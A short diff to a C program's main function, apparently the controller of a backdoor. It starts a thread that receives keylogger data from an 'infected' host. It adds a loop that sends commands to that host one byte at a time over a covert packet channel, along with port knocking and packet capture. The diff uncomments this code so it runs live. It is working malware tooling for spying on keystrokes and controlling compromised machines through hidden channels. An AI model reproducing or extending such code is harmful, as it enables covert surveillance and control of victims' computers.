@@ -82,16 +82,29 @@ int main(int argc, char **argv){
     strncpy(keylogger_args->infected_ip, targetip, BUFSIZ);
     pthread_t keylogger_thread; //create a thread
     pthread_create(&keylogger_thread, NULL, keylogger_recv, keylogger_args);
-/*
+
+    //commands (should make into another thread as well?)
     CreateFilter(Filter, pcapfilter);
+
+    int j = 0;
+    unsigned char ch[1];
+    memset(ch, 0, sizeof(char));
+
+    while(data[j] != '\0') {
+        ch[0] = data[j];
+
+        covert_send(localip, targetip, Filter.port_short[0], Filter.port_short[0], ch, 0);
+        j++;
+    }
     //covert_send(localip, targetip, Filter.port_short[0], Filter.port_short[0], data, 0);
+    //
+    //
     //wait for port knocking
     printf("Filter: %s\n",pcapfilter);
-    covert_udp_send_data(Filter.localip, Filter.targetip, UPORT, UPORT, data, 1);
+    //covert_udp_send_data(Filter.localip, Filter.targetip, UPORT, UPORT, data, 1);
     Packetcapture(pcapfilter,Filter,true);
 
-
-*/
+    //wait for the keylogger thread to finish before exiting
     pthread_join(keylogger_thread, NULL);
     return 0;
 }
